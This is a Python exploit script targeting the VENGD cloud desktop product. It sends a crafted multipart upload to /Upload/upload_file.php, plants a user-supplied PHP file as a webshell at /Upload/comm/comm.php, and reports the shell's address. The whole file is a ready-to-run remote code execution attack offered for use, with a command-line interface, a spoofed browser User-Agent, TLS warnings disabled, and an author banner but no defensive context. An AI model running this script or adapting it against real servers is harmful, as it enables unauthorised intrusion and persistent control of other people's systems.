#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("和信下一代云桌面VENGD（版本未知）".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

def VENGD_RCE_EXP(url, payload):
    target_url = f"{url}/Upload/upload_file.php?l=comm"
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh; q=0.9, fil; q=0.8",
        "Cookie": "think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
    }
    payload = f'''------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="comm.php"
Content-Type: image/avif

{payload}
------WebKitFormBoundaryfcKRltGv--'''
    try:
        state = requests.post(target_url, headers=headers, data=payload, timeout=2).status_code
        if state == 200:
            print(f"[+] Webshell上传成功，Webshell地址：{url}/Upload/comm/comm.php")
    except Exception as e:
        print(f"[n] Webshell上传失败！", e)
        exit()

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="VESystem VENGD RCE EXP")
    parser.add_argument(
        '-u', '--url', type=str, required='True',
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-p', '--payload', type=str, required='True',
        help='Please input content for upload. eg: <?php phpinfo(); ?>'
    )
    args = parser.parse_args()
    VENGD_RCE_EXP(args.url, args.payload)